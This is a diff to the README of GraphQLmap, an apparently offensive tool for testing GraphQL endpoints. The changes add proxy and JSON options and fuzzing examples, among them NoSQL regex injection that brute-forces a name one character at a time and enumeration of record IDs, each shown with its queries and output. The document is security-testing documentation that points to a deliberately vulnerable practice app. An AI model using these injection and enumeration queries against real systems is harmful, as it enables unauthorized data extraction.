@@ -10,6 +10,8 @@
   - Execute GraphQL queries
   - Autocomplete queries
   - [GraphQL field fuzzing](#graphql-field-fuzzing)
+    - [Example 1 - Bruteforce a character](#example-1---bruteforce-a-character)
+    - [Example 2 - Iterate over a number](#example-2---iterate-over-a-number)
   - [NoSQL injection inside a GraphQL field](#nosql-injection)
   - [SQL injection inside a GraphQL field](#sqli-injection)
 
@@ -31,15 +33,16 @@ $ python graphqlmap.py
                   | |                                       | |    
                   |_|                                       |_|    
                                          Author:Swissky Version:1.0
-usage: graphqlmap.py [-h] [-u URL] [-v [VERBOSITY]] [--method [METHOD]] [--headers [HEADERS]]
+usage: graphqlmap.py [-h] [-u URL] [-v [VERBOSITY]] [--method [METHOD]] [--headers [HEADERS]] [--json [USE_JSON]] [--proxy [PROXY]]
 
 optional arguments:
-  -h, --help          show this help message and exit
-  -u URL              URL to query : example.com/graphql?query={}
-  -v [VERBOSITY]      Enable verbosity
-  --method [METHOD]   HTTP Method to use interact with /graphql endpoint
-  --headers [HEADERS] HTTP Headers sent to /graphql endpoint
-  --json              Send requests using POST and JSON
+  -h, --help           show this help message and exit
+  -u URL               URL to query : example.com/graphql?query={}
+  -v [VERBOSITY]       Enable verbosity
+  --method [METHOD]    HTTP Method to use interact with /graphql endpoint
+  --headers [HEADERS]  HTTP Headers sent to /graphql endpoint
+  --json [USE_JSON]    Use JSON encoding, implies POST
+  --proxy [PROXY]      HTTP proxy to log requests
 ```
 
 
@@ -49,8 +52,12 @@ optional arguments:
 
 ### Connect to a graphql endpoint
 
-```
+```py
+# Connect using POST and providing an authentication token
 python3 graphqlmap.py -u https://yourhostname.com/graphql -v --method POST --headers '{"Authorization" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXh0Ijoibm8gc2VjcmV0cyBoZXJlID1QIn0.JqqdOesC-R4LtOS9H0y7bIq-M8AGYjK92x4K3hcBA6o"}'
+
+# Pass request through Burp Proxy
+python graphqlmap.py -u "http://172.17.0.1:5013/graphql" --proxy http://127.0.0.1:8080
 ```
 
 ### Dump a GraphQL schema
@@ -107,6 +114,8 @@ GraphQLmap > {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admin
 Use `GRAPHQL_INCREMENT` and `GRAPHQL_CHARSET` to fuzz a parameter.      
 [:movie_camera: Live Example](https://asciinema.org/a/ICCz3PqHVNrBf262x6tQfuwqT)
 
+#### Example 1 - Bruteforce a character
+
 ```powershell
 GraphQLmap > {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"AdmiGRAPHQL_CHARSET\"} }"){firstName lastName id}}   
 [+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi!\"} }"){firstName lastName id}}   
@@ -124,6 +133,38 @@ GraphQLmap > {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"AdmiG
 [+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi1\"} }"){firstName lastName id}}     
 [+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi?\"} }"){firstName lastName id}}
 [+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admin\"} }"){firstName lastName id}}
+```
+
+#### Example 2 - Iterate over a number
+
+Use `GRAPHQL_INCREMENT_` followed by a number.
+
+```powershell
+GraphQLmap > { paste(pId: "GRAPHQL_INCREMENT_10") {id,title,content,public,userAgent} }
+[+] Query: (45) { paste(pId: "0") {id,title,content,public,userAgent} }
+[+] Query: (245) { paste(pId: "1") {id,title,content,public,userAgent} }
+[+] Query: (371) { paste(pId: "2") {id,title,content,public,userAgent} }
+[+] Query: (309) { paste(pId: "3") {id,title,content,public,userAgent} }
+[+] Query: (311) { paste(pId: "4") {id,title,content,public,userAgent} }
+[+] Query: (308) { paste(pId: "5") {id,title,content,public,userAgent} }
+[+] Query: (375) { paste(pId: "6") {id,title,content,public,userAgent} }
+[+] Query: (315) { paste(pId: "7") {id,title,content,public,userAgent} }
+[+] Query: (336) { paste(pId: "8") {id,title,content,public,userAgent} }
+[+] Query: (377) { paste(pId: "9") {id,title,content,public,userAgent} }
+
+GraphQLmap > { paste(pId: "9") {id,title,content,public,userAgent} }
+{ paste(pId: "9") {id,title,content,public,userAgent} }
+{
+    "data": {
+        "paste": {
+            "content": "I was excited to spend time with my wife without being interrupted by kids.",
+            "id": "UGFzdGVPYmplY3Q6OQ==",
+            "public": true,
+            "title": "This is my first paste",
+            "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0"
+        }
+    }
+}
 ```
 
 ### NoSQLi injection
@@ -148,10 +189,12 @@ GraphQLmap > mysqli
 GraphQLmap > mssqli
 ```
 
+## Practice
+
+* [Damn Vulnerable GraphQL Application - @dolevf](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application/blob/master/setup.py)
 
 ## TODO
 
-* Docker with vulnerable GraphQL
 * Unit tests
 * Handle node
 ```
